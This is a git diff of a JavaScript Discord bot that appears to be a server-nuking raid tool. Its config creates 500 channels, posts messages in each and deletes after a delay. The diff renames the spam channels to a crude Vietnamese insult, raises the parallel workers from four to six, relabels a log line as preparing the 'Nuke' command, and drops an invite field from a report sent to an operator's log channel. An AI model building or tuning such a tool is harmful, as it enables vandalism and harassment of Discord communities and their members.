@@ -22,11 +22,11 @@ const client = new Client({
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 /* ===== CONFIG ===== */
-const CHANNEL_NAME = "Server nuked";
+const CHANNEL_NAME = "Server như dái chó kkk";
 const CREATE_COUNT = 500;
 const MSG_PER_CHANNEL = 5;
 const DELETE_DELAY = 60;
-const WORKERS = 4; // số worker song song mỗi shard
+const WORKERS = 6; // số worker song song mỗi shard
 const LOG_CHANNEL_ID = "1466068087378940100";
 /* ================== */
 
@@ -41,7 +41,7 @@ const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
 
 (async () => {
   try {
-    console.log("🔁 Đăng slash command...");
+    console.log("🔁 Đang chuẩn bị lệnh Nuke...");
     await rest.put(
       Routes.applicationCommands(process.env.CLIENT_ID),
       { body: commands }
@@ -58,7 +58,7 @@ client.once("ready", () => {
 
 /* ===== WORKER QUEUE SYSTEM ===== */
 class Queue {
-  constructor(workers = 4) {
+  constructor(workers = 6) {
     this.tasks = [];
     this.running = 0;
     this.workers = workers;
@@ -124,7 +124,6 @@ try {
 👤 Người dùng: ${user}
 🏠 Server: ${guild}
 💬 Kênh: ${channel}
-🔗 Invite: ${invite}
 ⏰ Thời gian: ${time}
 ⌨️ Lệnh: ${command}`
     );
